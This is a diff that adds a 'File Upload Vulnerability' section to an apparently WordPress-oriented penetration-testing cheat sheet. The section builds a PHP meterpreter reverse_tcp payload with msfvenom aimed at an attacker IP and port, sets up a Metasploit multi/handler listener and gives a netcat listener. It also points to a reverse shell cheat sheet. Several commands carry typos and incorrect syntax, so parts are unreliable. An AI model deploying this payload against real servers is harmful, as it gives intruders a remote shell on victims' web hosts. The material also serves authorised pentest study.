@@ -216,7 +216,24 @@ msf auxiliary(wordpress_login_enum) > exploit
   
   
 ```
+### File Upload Vulnerability
+```shell
+msfvenom -p php/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=<attacker-port> -f raw > file.php
   
+msfdb init && msfconsole
+use multi/handler
+set payload php/meterepreter/reverse_tcp
+set LHOST=attacker-ip
+set LPORT= attcker-port
+run
+
+# If incase, metaspolit not working use NetCat and shell code below
+
+```
+> [Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) : Use the code, change IP & Port and use it with NetCat listener  
+```console
+nc -vnl -p 1234
+```
   
 </details>
 
